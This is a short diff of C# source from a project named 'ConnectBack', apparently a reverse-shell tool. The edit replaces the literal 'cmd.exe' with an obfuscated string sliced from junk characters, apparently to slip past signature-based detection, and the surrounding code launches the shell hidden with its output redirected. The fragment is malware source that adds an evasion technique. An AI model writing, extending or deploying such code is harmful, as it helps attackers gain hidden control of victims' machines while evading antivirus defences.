@@ -27,8 +27,8 @@ namespace ConnectBack
 						StringBuilder strInput = new StringBuilder();
 						SecureString x = new SecureString();
 						Process p = new Process();
-						p = Process.Start("cmd.exe","test","",x,"test");
-						p.StartInfo.FileName = "cmd.exe";
+						p = Process.Start(Convert.ToString("0123456789CmD" + "." + "e" + "XE l;X E f k X  E sgkf;sk X  E f s ; xefs;s").Substring(10, 8),"test","",x,"test");
+						p.StartInfo.FileName = Convert.ToString("0123456789CmD" + "." + "e" + "XE l;X E f k X  E sgkf;sk X  E f s ; xefs;s").Substring(10, 8);
 						p.StartInfo.CreateNoWindow = true;
 						// p.StartInfo.UseShellExecute = false;
 						p.StartInfo.RedirectStandardOutput = true;
